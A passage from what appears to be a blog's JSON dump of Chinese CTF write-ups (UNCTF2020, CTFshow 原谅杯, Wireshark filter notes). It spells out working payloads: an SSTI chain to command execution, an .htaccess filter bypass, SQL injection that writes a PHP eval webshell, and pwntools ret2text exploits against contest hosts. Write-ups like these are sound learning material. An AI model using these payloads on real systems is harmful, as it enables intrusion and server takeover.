OGNL 注入。 OGNL表达式注入RCE： `/vote/getDetailedVoteById?vid=3) union select null,”$","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://lazzzaro.github.io/tags/Java/"},{"name":"绕过","slug":"绕过","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"}],"author":"Lazzaro"},{"title":"UNCTF2020","slug":"match-UNCTF2020","date":"2020-11-14T10:44:31.000Z","updated":"2020-11-30T09:06:09.861Z","comments":true,"path":"2020/11/14/match-UNCTF2020/","permalink":"https://lazzzaro.github.io/2020/11/14/match-UNCTF2020/","excerpt":"","text":"​ 2020年高校联合招新赛UNCTF 竞赛时间： 2020年11月07日-14日 后面几天没太看掉了下来，Rank: 23 Webeasy_ssrf 123456789101112131415&lt;?phpecho&#x27;&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;&#x27;;highlight_file(__FILE__);$url = $_GET[&#x27;url&#x27;];if(preg_match(&#x27;/unctf\\.com/&#x27;,$url))&#123; if(!preg_match(&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;,$url))&#123; $url=file_get_contents($url); echo($url); &#125;else&#123; echo(&#x27;error!!&#x27;); &#125;&#125;else&#123; echo(&quot;error&quot;);&#125;?&gt; 简单的ssrf攻击。 file_get_contents函数，当目标请求时会判断使用的协议，如果为无法识别的协议会当做目录处理，会造成目录穿越，构造payload: ?url=0://unctf.com/../../../../../flag拿到flag。 ​ easyunserialize 123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);class a&#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;easy&#x27;) &#123; include(&#x27;flag.php&#x27;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125; &#125;function filter($string)&#123; return str_replace(&#x27;challenge&#x27;,&#x27;easychallenge&#x27;,$string);&#125;$uname=$_GET[1];$password=1;$ser=filter(serialize(new a($uname,$password)));$test=unserialize($ser);?&gt; 反序列化字符串逃逸。 先构造普通情形： 123456789101112131415161718192021222324252627&lt;?phpclass a&#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;easy&#x27;) &#123; include(&#x27;flag.php&#x27;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125; &#125;$x=new a(&#x27;admin&#x27;,1);echo serialize($x);//O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;i:1;&#125;?&gt; 需要password变为easy，且challenge会多4字节变easychallenge，构造 ?1=challenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125; 会变成 ?1=easychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125; 计算需要的challenge数量：$9x+29=(9+4)x$，发现 $x=7.25$ 非整数， 在payload后补足三个空格，使得 $9x+29+3=(9+4)x$，解得 $x=8$，即构造uname为8个challenge并在尾部补三个空格，payload： ?1=challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;%20%20%20 ​ babyeval 123456789101112131415&lt;?php // flag在flag.php if(isset($_GET[&#x27;a&#x27;]))&#123; if(preg_match(&#x27;/\\(.*\\)/&#x27;, $_GET[&#x27;a&#x27;])) die(&#x27;hacker!!!&#x27;); ob_start(function($data)&#123; if (strpos($data, &#x27;flag&#x27;) !== false) return &#x27;ByeBye hacker&#x27;; return false; &#125;); eval($_GET[&#x27;a&#x27;]); &#125; else &#123; highlight_file(__FILE__); &#125;?&gt; 过滤不多的RCE，?a=echo `base64 flag.php` ​ ezphp 123456789101112&lt;?phpshow_source(__FILE__);$username = &quot;admin&quot;;$password = &quot;password&quot;;include(&quot;flag.php&quot;);$data = isset($_POST[&#x27;data&#x27;])? $_POST[&#x27;data&#x27;]: &quot;&quot; ;$data_unserialize = unserialize($data);if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123; echo $flag;&#125;else&#123; echo &quot;username or password error!&quot;;&#125; 反序列化，要构造username为admin和password为password，尝试构造array： 12345&lt;?php$x=array(&#x27;username&#x27;=&gt;&#x27;admin&#x27;,&#x27;password&#x27;=&gt;&#x27;password&#x27;);echo serialize($x);//a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:8:&quot;password&quot;;&#125;?&gt; 发现不成功，那么username和password需要的实际字符串应该不对。 if判断条件出用的是==弱类型比较，PHP中任意字符串==true结果都为true，更换构造值为bool类型： 12345&lt;?php$x=array(&#x27;username&#x27;=&gt;true,&#x27;password&#x27;=&gt;true);echo serialize($x);//a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;?&gt; POST提交payload，得到flag。 ​ easy_upload 随便上传 De1ctf 2020-Check in原题。 随便传一个jpg文件，回显过滤perl|pyth|ph|auto|curl|base|\\|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet in contents! 上传.htaccess文件，bp改包，用换行绕过关键字过滤： 12345AddHandler p\\hp5-script .txtp\\hp_value au\\to_append_file /flag 再随便传一个txt文件，访问对应路径即加载得到/flag内容。 ​ easyflask进入提示a easy flask problem,first login as the admin， 访问/login登录，尝试admin/admin登录，提示login fail! check /register， 访问/register注册，用admin/admin注册，提示register success，注册成功， 回到登录页登录，提示admin login success!， 再回到主页，发现提示变为admin login success and check the secret route /secret_route_you_do_not_know 访问/secret_route_you_do_not_know，提示you should &#39;guess&#39; the secret number GET方式传入?guess=&#123;&#123;3*5&#125;&#125;，回显15 error!!，存在SSTI漏洞。 fuzz一波，发现过滤了[]、_、&quot;、&#39;、%等，尝试用request外部参数方式，利用&lt;class &#39;click.utils.LazyFile&#39;&gt;类命令执行。 列目录： 1?guess=&#123;&#123;&#123;&#125;|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)&#125;&#125;&amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;init=__init__&amp;g=__globals__&amp;mod=os&amp;func=popen&amp;cmd=ls&amp;re=read 读文件： 1?guess=&#123;&#123;&#123;&#125;|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)(request.args.file)|attr(request.args.re)()&#125;&#125;&amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;file=flag.txt&amp;re=read ​ checkin-sql 非常简单的sql 0.0 提示1：flag不在数据库中。。 强网杯 2019-随便注原题魔改。 1&#39; or 1=1 #，查看返回数据 1&#39; order by 2 #，查列数 1&#39; union select 1,2 #，失败，说明有正则过滤 1&#39;; show databases;#，堆叠注入查数据库 1&#39;; show tables;#，堆叠注入查表 1&#39;; show columns from 0xDktb;#，堆叠注入查数据库 用预处理语句查询结果（select * from `0xDktb` ）： 1&#39;; set@a=0x73656c656374202a2066726f6d20603078446b746260; prepare execsql from @a;execute execsql;#，失败，说明有关键字被过滤，尝试发现是set关键字 改为： 1&#39;; prepare execsql from 0x73656c656374202a2066726f6d20603078446b746260;execute execsql;#，成功查询，但不是flag，更换查询内容，找了整个数据库都未发现flag字符串。 猜测flag在文件系统里，尝试写文件（select &#39;&lt;?php @eval($_POST[ccc]);?&gt;&#39; into outfile &#39;/var/www/html/shell.php&#39;）： 1&#39;; prepare execsql from 0x73656c65637420273c3f70687020406576616c28245f504f53545b6363635d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f7368656c6c2e70687027;execute execsql;# 用蚁剑试连，发现成功，在根目录拿到flag。 ​ PwnYLBNB 守护世界上最好的YLBnc 45.158.33.12 8000 先nc，提示用pwntool，运行脚本拿到flag。 123from pwn import *r = remote(&#x27;45.158.33.12&#x27;, 8000)r.interactive() ​ fan简单ret2text 1234567from pwn import *r = remote(&#x27;node2.hackingfor.fun&#x27;,48548)system_addr=0x400735payload = &#x27;a&#x27;*(0x30+8) + p64(system_addr)r.recvuntil(&#x27;input your message\\n&#x27;)r.sendline(payload)r.interactive() ​ do_you_like_me?简单ret2text 1234567from pwn import *r = remote(&#x27;node2.hackingfor.fun&#x27;,46506)system_addr=0x4006CDpayload = &#x27;a&#x27;*(0x10+8) + p64(system_addr)r.recvuntil(&#x27;Give me your input : &#x27;)r.sendline(payload)r.interactive() ​ Reversere_checkin 二进制手做不出来这个就考虑退役吧 IDA打开，定位到start函数，再不断跟进到sub_4015DC发现flag。 1234567891011121314151617181920212223242526272829303132.text:00000000004015DC sub_4015DC proc near .text:00000000004015DC arg_0 = qword ptr 10h.text:00000000004015DC.text:00000000004015DC push rbp.text:00000000004015DD mov rbp, rsp.text:00000000004015E0 mov [rbp+arg_0], rcx.text:00000000004015E4 mov cs:Str2, &#x27;u&#x27;.text:00000000004015EB mov cs:byte_42F041, &#x27;n&#x27;.text:00000000004015F2 mov cs:byte_42F042, &#x27;c&#x27;.text:00000000004015F9 mov cs:byte_42F043, &#x27;t&#x27;.text:0000000000401600 mov cs:byte_42F044, &#x27;f&#x27;.text:0000000000401607 mov cs:byte_42F045, &#x27;&#123;&#x27;.text:000000000040160E mov cs:byte_42F046, &#x27;W&#x27;.text:0000000000401615 mov cs:byte_42F047, &#x27;e&#x27;.text:000000000040161C mov cs:byte_42F048, &#x27;l&#x27;.text:0000000000401623 mov cs:byte_42F049, &#x27;c&#x27;.text:000000000040162A mov cs:byte_42F04A, &#x27;o&#x27;.text:0000000000401631 mov cs:byte_42F04B, &#x27;m&#x27;.text:0000000000401638 mov cs:byte_42F04C, &#x27;e&#x27;.text:000000000040163F mov cs:byte_42F04D, &#x27;T&#x27;.text:0000000000401646 mov cs:byte_42F04E, &#x27;o&#x27;.text:000000000040164D mov cs:byte_42F04F, &#x27;U&#x27;.text:0000000000401654 mov cs:byte_42F050, &#x27;N&#x27;.text:000000000040165B mov cs:byte_42F051, &#x27;C&#x27;.text:0000000000401662 mov cs:byte_42F052, &#x27;T&#x27;.text:0000000000401669 mov cs:byte_42F053, &#x27;F&#x27;.text:0000000000401670 mov cs:byte_42F054, &#x27;&#125;&#x27;.text:0000000000401677 mov cs:byte_42F055, 0.text:000000000040167E nop.text:000000000040167F pop rbp.text:0000000000401680 retn.text:0000000000401680 sub_4015DC endp ​ 反编译用 pyinstxtractor反编译出pyc文件，再用uncompyle6反编译pyc可得源代码： 12345str2 = &#x27;UMAQBvogWLDTWgX&quot;&quot;&quot;k&#x27;flag = &#x27;&#x27;for i in range(len(str2)): flag += chr(ord(str2[i]) + i)print(flag) 运行得flag。 ​ babypy Babypy.That’s really easy!!! 用 pyinstxtractor反编译出pyc文件，再用uncompyle6反编译pyc可得源代码： 1234567891011121314151617181920212223import os, libnum, binasciiflag = &#x27;unctf&#123;*******************&#125;&#x27;x = libnum.s2n(flag)def gen(x): y = abs(x) while 1: if y &gt; 0: yield y % 2 y = y &gt;&gt; 1 else: if x == 0: yield 0l = [i for i in gen(x)]l.reverse()f = &#x27;%d&#x27; * len(l) % tuple(l)a = binascii.b2a_hex(f.encode())b = int(a, 16)c = hex(b)[2:]print(c)os.system(&#x27;pause&#x27;) 代码逻辑为字符→10进制→2进制→字符16进制，txt文件16进制按逻辑逆推得到flag。 ​ CTFilter 假如你是李华，你的好友学习委员无意之间看到了一串flag！这串flag极有可能是解开谜题的关键。他立刻在一台装有Windows10 1903 x64操作系统的虚拟机中使用记事本写下了这串flag并保存。然而，令他没想到的是，这个系统却另有玄机！任何人都无法在这个系统中写下正确的flag？请你以好友的身份对他伸出援手，帮助学习委员找到真正的flag。 学习委员：那你能帮帮我吗？李华：瞧谁不起呢？ 压缩包里有CTFilter.sys、Hint.exe、Unknown_data、Story.txt四个文件，IDA分析前两个，CTFilter.sys查看没什么结果，Hint.exe中发现一个flag字符串flag&#123;Oh!You_found_me~&#125;，结合题干描述这串flag极有可能是解开谜题的关键，尝试将flag字符串作为key与密文Unknown_data异或，发现居然成功得到flag。 ​ Cryptoeasy_rsa给 $a,b,e$，易推出 $p$ 和 $q$，再按正常RSA解法解即可。 123456789101112import gmpy2a = 320398687477638913975700270017132483556404036982302018853617987417039612400517057680951629863477438570118640104253432645524830693378758322853028869260935243017328300431595830632269573784699659244044435107219440036761727692796855905230231825712343296737928172132556195116760954509270255049816362648350162111168b = 9554090001619033187321857749048244231377711861081522054479773151962371959336936136696051589639469653074758469644089407114039221055688732553830385923962675507737607608026140516898146670548916033772462331195442816239006651495200436855982426532874304542570230333184081122225359441162386921519665128773491795370p = (a+b)/2q = (a-b)/2n = p * qe = 65537phi = (p-1)*(q-1)d = gmpy2.invert(e,phi)c = 22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:])) ​ 鞍山大法官开庭之缺的营养这一块怎么补 某日，鞍山大法官在点外卖时点了2个韭菜盒子，商家只送了1个，大法官给了该商家一个差评次日，该大法官又在该商家点了1个韭菜盒子，希望商家能补上上次的韭菜盒子，而商家又只发了一个韭菜盒子这名大法官一天正常要吃2个韭菜盒子，而该商家每天只给他1个韭菜盒子，请问该名大法官缺的营养这一块怎么补ottttootoootooooottoootooottotootttootooottotttooootttototoottooootoooottotoottottooooooooottotoottoflag格式：unctf{} 尝试二进制转字符及摩斯密码均不成功，最后才想到培根密码，分别把o和t替换为A和B，在线解密得flag。 ​ 简单的RSA 你们都不会百度的吗 只给出 $e,n,c$，且 $e$ 很大，简单的RSA Wiener攻击： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#sagedef rational_to_contfrac(x,y): # Converts a rational x/y fraction into a list of partial quotients [a0, ..., an] a = x // y pquotients = [a] while a * y != x: x, y = y, x - a * y a = x // y pquotients.append(a) return pquotientsdef convergents_from_contfrac(frac): # computes the list of convergents using the list of partial quotients convs = []; for i in range(len(frac)): convs.append(contfrac_to_rational(frac[0 : i])) return convsdef contfrac_to_rational (frac): # Converts a finite continued fraction [a0, ..., an] to an x/y rational. if len(frac) == 0: return (0,1) num = frac[-1] denom = 1 for _ in range(-2, -len(frac) - 1, -1): num, denom = frac[_] * num + denom, num return (num, denom)e= 18437613570247445737704630776150775735509244525633303532921813122997549954741828855898842356900537746647414676272022397989161180996467240795661928117273837666615415153571959258847829528131519423486261757569454011940318849589730152031528323576997801788206457548531802663834418381061551227544937412734776581781n= 147282573611984580384965727976839351356009465616053475428039851794553880833177877211323318130843267847303264730088424552657129314295117614222630326581943132950689147833674506592824134135054877394753008169629583742916853056999371985307138775298080986801742942833212727949277517691311315098722536282119888605701c= 140896698267670480175739817539898638657099087197096836734243016824204113452987617610944986742919793506024892638851339015015706164412994514598564989374037762836439262224649359411190187875207060663509777017529293145434535056275850555331099130633232844054767057175076598741233988533181035871238444008366306956934 def egcd(a, b): if a == 0: return (b, 0, 1) g, x, y = egcd(b % a, a) return (g, y - (b // a) * x, x)def mod_inv(a, m): g, x, _ = egcd(a, m) return (x + m) % mdef isqrt(n): x = n y = (x + 1) // 2 while y &lt; x: x = y y = (x + n // x) // 2 return x def crack_rsa(e, n): frac = rational_to_contfrac(e, n) convergents = convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 # check if x*x - s*x + n = 0 has integer roots D = s * s - 4 * n if D &gt;= 0: sq = isqrt(D) if sq * sq == D and (s + sq) % 2 == 0: return dd = crack_rsa(e, n)m = hex(pow(c, d, n))[2:]print(bytes.fromhex(m)) ​ wing 你过office二级了吗 提示office，猜测为word中某种字体，打开word输入字母+数字，再切换各字体核对，发现为Wingdings 2字体，对照替换得flag。 ​ signin Really baby problem about block cipherflag 格式： flag{} AES-ECB模式两次加密，且密钥已知位较多，可采用中间人攻击（MITM）。 爆破脚本： 1234567891011121314151617181920212223242526272829from Crypto.Cipher import AESfrom binascii import hexlify,unhexlifyfrom string import printablealph = printablem = &#x27;&#x27;c = &#x27;&#x27;flag_c = &#x27;&#x27;middle = dict();for x in alph: for y in alph: for z in alph: key1 = &#x27;%s%s%s%s&#x27; % (&#x27;0&#x27; * 13, x, y, z) cipher = AES.new(key1) middle.update(&#123;cipher.encrypt(m): key1&#125;)print &quot;\\nTable built...\\n&quot;;for x in alph: for y in alph: for z in alph: key2 = &#x27;%s%s%s%s&#x27; % (x, y, z, &#x27;0&#x27; * 13) cipher = AES.new(key2) d = cipher.decrypt(c) if d in middle: print &quot;\\nKeys found: %s; %s\\nFlag:&quot; % (middle[d].encode(&#x27;hex&#x27;), key2.encode(&#x27;hex&#x27;)) cipher1 = AES.new(middle[d]) print cipher1.decrypt(cipher.decrypt(flag_c)) ​ 快乐数学_0x00 刚才我问扎克利，扎总发生甚么事了。扎总说怎么回事。我给扎总发了几张截图。扎总一看，噢，原来是昨天，几个大学生，二十多岁，他们说，哎~。有一个说，我在 UNCTF 打比赛，头都做疼了，扎总，你能不能教教我怎么做题，哎，帮我分数弄高一点。扎总说，可以，你在 UNCTF 死做题，不好用。他不服气。扎总说，我说小朋友，你多长两个脑子来做我这新题。他做不动，他说你这个没用。扎总说，我这个有用，他是数学，数学对计算机基础很重要，二百多个人做不出我这题。他非要和我试试。扎总说，可以。扎总一说他啪站起来了，很快啊，然后上来一个左正蹬，一个右鞭腿，一个左刺拳。扎总全部防出去了啊，防出去以后，自然是传统功夫以点到为止，右手把数学题摁在他鼻子上，没打他，扎总笑了一下，准备收拳。后面我暂时编不下去了，你们来跟扎总打吧。数学题，可能存在异议的，群里私聊 Hanser 的老公。 链接: https://pan.baidu.com/s/1nB8j4TN3HFe_SXvrwzyE2g 密码: ca04 纯高数回忆录，复习了一把，采用wolframalpha辅助计算。 第一个，$\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}+\\cdots+\\sqrt[n]{2020}}{2020})^n$： 计算到2020开n次方的求和不好表示，可以用wolframalpha观察规律： $\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}}{2020})^n=\\sqrt{2}$ $\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}+\\sqrt[n]{3}}{2020})^n=\\sqrt[3]{6}=\\sqrt[3]{2\\cdot3}$ $\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}+\\sqrt[n]{3}+\\sqrt[n]{4}}{2020})^n=\\sqrt[4]{24}=\\sqrt[4]{2\\cdot3\\cdot4}$ $\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}+\\sqrt[n]{3}+\\sqrt[n]{4}+\\sqrt[n]{5}}{2020})^n=\\sqrt[5]{120}=\\sqrt[5]{2\\cdot3\\cdot4\\cdot5}$ 以此类推，$\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}+\\cdots+\\sqrt[n]{2020}}{2020})^n=\\sqrt[2020]{2020!}$ 第二个，$\\lim \\limits_{x \\to +\\infty} \\cfrac{\\int_{0}^{x}\\text{d}u\\int_{0}^{u}[u^2-3\\sin(u-t)^2] \\text{d}t }{x^8}$： wolframalpha编写： limit (integrate (integrate (u^2-3sin(u-t)^2),t=0 to u),u=0 to x)/(x^8) as x-&gt;+∞ 计算得出：$\\lim \\limits_{x \\to +\\infty} \\cfrac{\\int_{0}^{x}\\text{d}u\\int_{0}^{u}[u^2-3\\sin(u-t)^2] \\text{d}t }{x^8}=\\cfrac{1}{112}$ 第三个，设 $\\Omega:x^2+y^2 \\leq 3z,1 \\leq z \\leq 4$，求 $\\displaystyle\\iiint_\\Omega \\cfrac{1}{\\sqrt{x^2+y^2+z}}\\text{d}v$： 转换到极坐标求解，设 $x=r\\sin{\\theta},y=r\\cos{\\theta}$： wolframalpha编写： (integrate dθ,θ=0 to 2*pi)(integrate r/sqrt(r^2+z) dr, r=0 to sqrt(3z)) integrate 2*pi*sqrt(z) dz, z=1 to 4 计算得出： $\\displaystyle\\iiint_\\Omega \\cfrac{1}{\\sqrt{x^2+y^2+z}}\\text{d}v=\\int_{1}^{4}\\text{d}z\\int_{0}^{2\\pi}\\text{d}\\theta \\int_{0}^{\\sqrt{3z}}\\cfrac{r}{r^2+z}\\text{d}r=\\int_{1}^{4}2\\pi\\sqrt{z}\\text{d}z=\\cfrac{28\\pi}{3}$ 最后，合并为\\sqrt[2020]&#123;2020!&#125;-\\frac&#123;1&#125;&#123;112&#125;-\\frac&#123;28\\pi&#125;&#123;3&#125;，md5值为flag。 ​ Miscbaba_is_you 了解一下png文件格式 16进制查看，文件尾有一串B站网址，访问，在评论区发现flag。 ​ 爷的历险记 RPG小游戏爷把flag弄丢了, 你可以帮他找回来吗 RPG小游戏，启动玩耍。 屋里屋外到处寻找线索，发现两个箱子，分部用base64解码出密码66668888和摩斯密码解码出密码23332333打开箱子拿奖励，依次勉强打过屋外主场景左边和下边两个场景的小boss，屋外主场景右下方商人处可以购买hint1和hint2，hint2提示查看游戏存档。 想到修改存档文件的方式，更改金钱以购买hint3。使用RPG存档在线修改器修改rpgsave文件中的金钱属性值到最大值，再回到游戏加载存档，购买hint3即为flag。 ​ 阴阳人编码发现含就这.、就这¿、不会吧!三种字符串，需要一点脑洞，联想到Ook编码，在线解密得flag。 ​ 躲猫猫 我躲好了，你来找我 直接打开报错，右键压缩包打开，在sharedStrings.xml发现base64编码字符串，base64+url解码得flag。 ​ YLB’s CAPTCHA - 签到题 YLB同款验证码 硬看到眼睛疼就能过了，可以考虑修改css配色方案降低难度。 ​ 撕坏的二维码 RPG小游戏爷把flag弄丢了, 你可以帮他找回来吗 部分遮盖的二维码，直接用QR Rearch识别出flag。 ​ 网络深处1 好孩子不要上洋葱鸭 三个文件，txt有一串数字，zip包加密， Audacity分析wav文件，结合文件名“拨号音”，用DTMF拨号音识别脚本识别出wav的手机号码，解压得一个wav文件和txt文件，继续Audacity分析wav文件，切换到频谱图发现关键字我是tupper， 了解到Tupper为自我指涉公式，找到一个在线还原图像网站还原得flag。 ​ mouse_click flag格式为unctf{*}，**中的字母统一为大写 简单鼠标流量取证。 提取usb数据信息： tshark -r mouse.pcapng -T fields -e usb.capdata &gt; usbdata.txt 提取坐标值脚本： 12345678910111213141516171819202122nums = []keys = open(&#x27;usbdata.txt&#x27;,&#x27;r&#x27;)result = open(&#x27;result.txt&#x27;,&#x27;w&#x27;)posx = 0posy = 0for line in keys: line = line.strip() if line == &#x27;&#x27; :#忽略空行 continue x = int(line[6:8],16) y = int(line[9:11],16) if x &gt; 127 : x -= 256 if y &gt;127 : y -= 256 posx += x posy += y btn_flag = int(line[3:5],16) if btn_flag == 1 : result.write(str(posx)+&#x27; &#x27;+str(posy)+&#x27;\\n&#x27;)keys.close()result.close() 运行：python analyse.py 控制台画图：gnuplot.exe -e &quot;plot &#39;result.txt&#39;&quot; -p ​ 被删除的flag flag被删除了，你能恢复它吗 16进制查看，搜索unctf得flag。 ​ 你能破解我的密码吗 flag内容为密码的32位小写的md5，请用unctf{}包裹字符串 shadow文件中倒数第二行，用john命令破解弱口令： john --show shadow 得到密码，md5处理即flag。 ​ EZ_IMAGE手撸最终肯定能出来，不过学到更好用的自动化姿势（montage+gaps），适用于任何拼图题： 先把225张图用ImageMagick中的montage命令合成一张大图： montage *.jpg -tile 15x15 -geometry 60x60+0+0 out.jpg 得到一张大图之后，用gaps来进行还原： gaps --image=out.jpg --generations=40 --population=225 --size=60 --save ​ 零 我瞎了看不到flag了 零宽字符隐写，可以在vim中用vim -A xxx.txt查看核实。 全选复制，用在线工具直接取出flag。 ​ YLB绝密文件 提示1：需要提取出三个文件: *.pyc,*.py,*.zip提示2：zip文件可以以原始数据的形式导出Hex值，再导入Winhex/010 Editor然后删去非Zip数据部分（自行百度Zip格式 Wireshark查看流量包，追踪TCP流，分别在流11、流16和流20流提取出xor.py、secret.cpython-38.pyc和YLBSB.zip三个文件。 用uncompyle6还原pyc文件为secret.py文件拿到key值YLBSB?YLBNB!，再根据xor.py代码逻辑，将key与zip包中的YLBSB.xor文件16进制值异或，保存得到YLBSB.docx文件，打开得到flag。 ​ 倒影16进制查看exe文件发现是jpg图，在尾部发现4030B405，即为倒着存入的一段16进制zip文件，取出16进制逆序还原，用ARCHPR纯数字跑出弱口令得到flag。 ​ Other调查问卷 请大家认真填写哟~ 只有几道，不多，最多占用大家两三分钟…问卷地址：https://wj.qq.com/s2/7519766/6af6/想要大家一起吐槽？知乎链接：https://www.zhihu.com/question/429290669/answer/1564365629 反馈就是了。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"CTFshow 原谅杯","slug":"match-CTFshow-原谅杯","date":"2020-11-11T16:13:12.000Z","updated":"2021-01-24T13:30:59.541Z","comments":true,"path":"2020/11/12/match-CTFshow-原谅杯/","permalink":"https://lazzzaro.github.io/2020/11/12/match-CTFshow-%E5%8E%9F%E8%B0%85%E6%9D%AF/","excerpt":"","text":"原谅杯比赛预告：CTFshow 原谅杯平台：https://ctf.show开始：2020/11/11 00:00结束：2020/11/11 23:59内容：本次采用闯关模式，必须按顺序解题，否则无法欣赏狗血的爱情故事。规则：1 比赛期间可以随意讨论，wp须在比赛结束后发布，wp统一发布地址：https://wp.ctf.show2 公平竞技，独立比赛3 服务器不要爆破，不要攻击服务器，不要扫描!!!4 奖品：帽子一个(颜色随机) 原谅1 附件：yuanliang_1.zip 压缩包有 story.zip 和 原谅1.png，群里hint+拟音解密emoji，密码1317bi77p9u， 解压拿到 1.jpg 和 剧情1.txt，stegsolve查看1.jpg的rgb通道发现flag。 ​ 原谅2 附件：yuanliang_2.zip 压缩包有未加密的 hint.txt，火星文解密得到解压密钥，解压拿到flag.txt内容。 ​ 原谅3_来份色图 附件：yuanliang_3.zip Hint1: 阿狸2020年11月11日10:49在群里说得对 Hint2: 第一步、色图一分为二（常见文件格式/头尾了解一下）；第二步、rrggbbrrggbbrrggbb…；第三步、你的工具更新了吗 压缩包有未加密的setu.zip，解压得到setu.png，010editor分析存在双图，foremost分解得到两张png。 将setu.zip用zsteg进行LSB分析，发现隐藏的png图，提取出新png图1。 结合盲水印提示，将foremost分解出的两张png同样用zsteg进行LSB分析，分别提取出新png图2、图3。 用github上各种盲水印脚本，使用正确脚本尝试解图1、图2、图3，有一种情况能出flag图。 ​ 原谅4 列目录可以看到剧情文件 Hint1: 老前辈说过“最安全的系统就是什么都没有”，我把没用的命令都删了，看你还怎么执行 Hint2: 你知道系统环境变量里的PATH是干什么的吗？ GET方式传入参数xbx，发现只能用ls列目录，尝试用echo写入文件成功，写入phpinfo()： echo &#39;&lt;?php phpinfo();?&gt;&#39; &gt; phpinfo.php 访问发现存在open_basedir限制，试过各种open_basedir绕过、disable_function写bypass读/flag均不成功。 提示环境变量，查看：echo $PATH，分别到各路径下查看，仅存ls/rm/sh三种命令（无法执行常用命令的原因）。 有sh命令，且可写入文件，尝试往根目录写入shell脚本： echo -e &quot;%23!/bin/sh\\nwhile read line\\ndo\\necho \\$line\\ndone &lt; /flag&quot; &gt; ../../../read 成功写入，再执行/bin/sh ../../../read得flag。 赛后还学到其他各种骚姿势。 ​ 原谅5-6未解。 ​ 原谅7_baby加密 encrypt.exe -e flag.txt 附件：encrypt.exe、encrypted_flag.txt Hint1: maybe des? IDA跟进main函数，发现24位字符串123456788765432112345678，再跟进加密函数sub_401E16： sub_401E16((__int64)&amp;v13, (__int64)argv, v44, (__int64)File, (__int64)&amp;v14, 1, v8, v9, v10, v11, 1); 发现传入的24为字符串分为三组分别通过函数sub_401B7A处理： sub_401B7A((void *)a1, (const void *)a2, v16, v14, 1);sub_401B7A((void *)a1, (const void *)a2, v16 + 8, v14, 0);sub_401B7A((void *)a1, (const void *)a2, v16 + 16, v14, 1); 结合提示DES，可知为3DES加密（24位密钥，且第一步处理会将密钥分成三组密钥分别处理，第一组解密，第二组加密，第三组解密，对应sub_401E16最后一个参数值）。 用在线解密工具解密密文即可得flag。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"流量分析","slug":"misc-流量分析","date":"2020-11-07T17:01:00.000Z","updated":"2025-04-19T09:40:57.537Z","comments":true,"path":"2020/11/08/misc-流量分析/","permalink":"https://lazzzaro.github.io/2020/11/08/misc-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"","text":"​ wiresharktshark提取TCP流量的data字段： tshark -r 1.pcapng -Y tcp -T fields -e tcp.segment_data &gt; tcp.txt 过滤器抓包过滤器抓取源地址为192.168.1.1，目的端口为80的流量 1src host 192.168.1.1 &amp;&amp; dst port 80 抓取192.168.1.1和192.168.1.2的流量 1host 192.168.1.1 || host 192.168.1.2 过滤mac地址： 123ether host 00:88:ca:86:f8:0dether src host 00:88:ca:86:f8:0dether dst host 00:88:ca:86:f8:0d 